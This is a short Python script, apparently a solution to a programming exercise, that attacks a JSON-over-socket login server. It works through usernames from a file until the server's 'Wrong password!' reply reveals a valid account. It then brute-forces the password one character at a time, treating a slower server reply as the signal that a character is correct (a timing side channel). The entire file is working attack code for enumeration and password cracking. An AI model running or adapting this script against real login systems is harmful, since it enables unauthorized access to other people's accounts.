import sys
import socket
import itertools
import json
import datetime

client_socket = socket.socket()
argv = sys.argv
hostname = argv[1]
port = int(argv[2])
address = (hostname, port)
client_socket.connect(address)
a = 0

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
data_input = {"login": "admin", "password": " "}

with open("logins.txt", 'r') as f:
    login_list = f.read().split("\n")

time_list = []

for new_login in login_list:
    data_input['login'] = new_login
    data = json.dumps(data_input)
    data = data.encode('utf-8')
    start = datetime.datetime.now()
    client_socket.send(data)
    response = client_socket.recv(1024)
    finish = datetime.datetime.now()
    response = response.decode('utf-8')
    response = json.loads(response)
    time = (finish-start).total_seconds()
    time_list.append(time)
    if response["result"] == "Wrong password!":
        break

max_time = max(time_list)

password = []
k = -1
while a != 1:
    password.append('a')
    k += 1
    for i in abc:
        password[k] = i
        password_ = "".join(password)
        #print(password_)
        data_input['password'] = password_
        data = json.dumps(data_input)
        data = data.encode('utf-8')
        start = datetime.datetime.now()
        client_socket.send(data)
        response = client_socket.recv(1024)
        finish = datetime.datetime.now()
        response = response.decode('utf-8')
        response = json.loads(response)
        time = (finish - start).total_seconds()
        #print(max_time, time)
        if time > max_time:
            break
        elif response["result"] == "Connection success!":
            a = 1
            break
    if response["result"] == "Connection success!":
        a = 1
        break

print(json.dumps(data_input))
client_socket.close()
